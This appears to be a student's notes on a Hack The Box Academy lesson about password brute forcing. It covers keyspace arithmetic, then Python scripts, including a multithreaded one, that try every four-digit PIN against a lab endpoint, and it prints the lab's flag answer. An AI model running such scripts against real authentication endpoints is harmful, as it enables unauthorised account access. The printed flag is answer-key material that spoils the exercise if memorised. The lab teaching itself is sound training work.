To truly grasp the challenge of brute forcing, it's essential to understand the underlying mathematics. The following formula determines the total number of possible combinations for a password:


```mathml
Possible Combinations = Character Set Size^Password Length
```

For example, a 6-character password using only lowercase letters (character set size of 26) has 26^6 (approximately 300 million) possible combinations. In contrast, an 8-character password with the same character set has 26^8 (approximately 200 billion) combinations. Adding uppercase letters, numbers, and symbols to the character set further expands the search space exponentially.

This exponential growth in the number of combinations highlights the importance of password length and complexity. Even a small increase in length or the inclusion of additional character types can dramatically increase the time and resources required for a successful brute-force attack.

Let's consider a few scenarios to illustrate the impact of password length and character set on the search space:

| Password Type           | Password Length | Character Set                               | Possible Combinations                              |
| ----------------------- | --------------- | ------------------------------------------- | -------------------------------------------------- |
| Short and Simple        | 6               | Lowercase letters (a-z)                     | 26^6 = 308,915,776                                 |
| Longer but Still Simple | 8               | Lowercase letters (a-z)                     | 26^8 = 208,827,064,576                             |
| Adding Complexity       | 8               | Lowercase and uppercase letters (a-z, A-Z)  | 52^8 = 53,459,728,531,456                          |
| Maximum Complexity      | 12              | Lowercase, uppercase, numbers, and symbols* | 94^12 â‰ˆ 4.76 Ã— 10^23 (475,920,493,781,698,549,504) |


As you can see, even a slight increase in password length or the inclusion of additional character types dramatically expands the search space. This significantly increases the number of possible combinations that an attacker must try, making brute-forcing increasingly challenging and time-consuming. However, the time it takes to crack a password isn't just dependent on the size of the search spaceâ€”it also hinges on the attacker's available computational power.

The more powerful the attacker's hardware (e.g., the number of GPUs, CPUs, or cloud-based computing resources they can utilize), the more password guesses they can make per second. While a complex password can take years to brute-force with a single machine, a sophisticated attacker using a distributed network of high-performance computing resources could reduce that time drastically.

![](https://academy.hackthebox.com/storage/modules/57/powern.png)

The above chart illustrates an exponential relationship between password complexity and cracking time. As the password length increases and the character set expands, the total number of possible combinations grows exponentially. This significantly increases the time required to crack the password, even with powerful computing resources.

Comparing the basic computer and the supercomputer:

- Basic Computer (1 million passwords/second): Adequate for cracking simple passwords quickly but becomes impractically slow for complex passwords. For instance, cracking an 8-character password using letters and digits would take approximately 6.92 years.
- Supercomputer (1 trillion passwords/second): Drastically reduces cracking times for simpler passwords. However, even with this immense power, cracking highly complex passwords can take an impractical amount of time. For example, a 12-character password with all ASCII characters would still take about 15000 years to crack.

## Cracking the PIN

**To follow along, start the target system via the question section at the bottom of the page.**

The instance application generates a random 4-digit PIN and exposes an endpoint (`/pin`) that accepts a PIN as a query parameter. If the provided PIN matches the generated one, the application responds with a success message and a flag. Otherwise, it returns an error message.

We will use this simple demonstration Python script to brute-force theÂ `/pin`Â endpoint on the API. Copy and paste this Python script below asÂ `pin-solver.py`Â onto your machine. You only need to modify the IP and port variables to match your target system information.


```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

The Python script systematically iterates all possible 4-digit PINs (0000 to 9999) and sends GET requests to the Flask endpoint with each PIN. It checks the response status code and content to identify the correct PIN and capture the associated flag.


```shell-session
smoothment@htb[/htb]$ python pin-solver.py

...
Attempted PIN: 4039
Attempted PIN: 4040
Attempted PIN: 4041
Attempted PIN: 4042
Attempted PIN: 4043
Attempted PIN: 4044
Attempted PIN: 4045
Attempted PIN: 4046
Attempted PIN: 4047
Attempted PIN: 4048
Attempted PIN: 4049
Attempted PIN: 4050
Attempted PIN: 4051
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
```

The script's output will show the progression of the brute-force attack, displaying each attempted PIN and its corresponding result. The final output will reveal the correct PIN and the captured flag, demonstrating the successful completion of the brute-force attack.

# Question
---

![Pasted image 20250213134207.png](../../../../IMAGES/Pasted%20image%2020250213134207.png)

Let's use the python script provided to us, let's modify it a bit for it to run faster:

```python
import requests
import threading
from queue import Queue

ip = "94.237.54.164"
port = 35008
NUM_THREADS = 20  # Adjust this based on your network capacity

# Shared resources
pin_queue = Queue()
found_event = threading.Event()
print_lock = threading.Lock()

def worker():
    while not found_event.is_set():
        try:
            pin = pin_queue.get_nowait()
        except:
            break

        formatted_pin = f"{pin:04d}"
        
        # Only print every 100 attempts to reduce output noise
        if pin % 100 == 0:
            with print_lock:
                print(f"Testing PIN: {formatted_pin}")

        try:
            response = requests.get(
                f"http://{ip}:{port}/pin?pin={formatted_pin}",
                timeout=5  # Add timeout to prevent hanging
            )
            
            if response.ok and 'flag' in response.json():
                with print_lock:
                    print(f"\n[+] Correct PIN found: {formatted_pin}")
                    print(f"[+] Flag: {response.json()['flag']}")
                found_event.set()
                break

        except Exception as e:
            pass  # Handle any request errors silently
        
        pin_queue.task_done()

# Fill the queue with all possible PINs
for pin in range(10000):
    pin_queue.put(pin)

# Create and start threads
threads = []
for _ in range(NUM_THREADS):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Wait for all threads to complete or flag found
for t in threads:
    t.join()

if not found_event.is_set():
    print("\n[-] Failed to find the correct PIN")
```

After a while, we get the following:

```
Testing PIN: 0000
Testing PIN: 0100
Testing PIN: 0200
Testing PIN: 0300
Testing PIN: 0400
Testing PIN: 0500
Testing PIN: 0600
Testing PIN: 0700
Testing PIN: 0800
Testing PIN: 0900
Testing PIN: 1000
Testing PIN: 1100
Testing PIN: 1200
Testing PIN: 1300
Testing PIN: 1400
Testing PIN: 1500
Testing PIN: 1600
Testing PIN: 1700
Testing PIN: 1800
Testing PIN: 1900
Testing PIN: 2000
Testing PIN: 2100
Testing PIN: 2200
Testing PIN: 2300
Testing PIN: 2400
Testing PIN: 2500
Testing PIN: 2600
Testing PIN: 2700
Testing PIN: 2800
Testing PIN: 2900
Testing PIN: 3000
Testing PIN: 3100

[+] Correct PIN found: 3145
[+] Flag: HTB{Brut3_F0rc3_1s_P0w3rfu1}
```

Flag is: 

```
HTB{Brut3_F0rc3_1s_P0w3rfu1}
```
